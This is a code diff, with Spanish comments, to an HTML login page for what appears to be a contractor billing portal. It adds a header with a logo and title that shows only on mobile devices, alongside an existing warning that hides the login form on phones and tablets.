@@ -209,6 +209,24 @@
             margin-top: 20px;
         }
 
+        /* Encabezado que se muestra en móviles bloqueados */
+        #mobile-header {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        #mobile-header img {
+            width: 150px;
+            margin-bottom: 10px;
+        }
+
+        #mobile-header h2 {
+            font-size: 1.8em;
+            margin: 0;
+        }
+
         .contact-text {
             text-align: center;
             font-size: 0.85em;
@@ -271,6 +289,14 @@
     </style>
 </head>
 <body>
+    <!-- Encabezado para móviles bloqueados -->
+    <div id="mobile-header">
+        <img src="https://d31n4s42c9zm35.cloudfront.net/cl/uploads/2023/10/logo-lipigas.svg" alt="Logo Empresa">
+        <h2>Portal de Cobros Contratistas</h2>
+        <p class="subtitle">Inicio de Sesión</p>
+    </div>
+
+    <!-- Advertencia para móviles -->
     <div id="mobile-warning">⚠️ Este sitio no está disponible para dispositivos móviles. Por favor, acceda desde una computadora de escritorio.</div>
 
     <div class="main-container" id="form-container">
@@ -348,9 +374,11 @@
 
         // Mostrar mensaje de advertencia para móviles
         window.onload = function() {
+            const mobileHeader = document.getElementById('mobile-header');
             const mobileWarning = document.getElementById('mobile-warning');
             const formContainer = document.getElementById('form-container');
             if (isMobileOrTablet()) {
+                mobileHeader.style.display = 'flex'; // Mostrar encabezado en móviles
                 mobileWarning.style.display = 'block'; // Mostrar advertencia en móviles
                 formContainer.style.display = 'none'; // Ocultar formulario de ingreso en móviles
             } else {
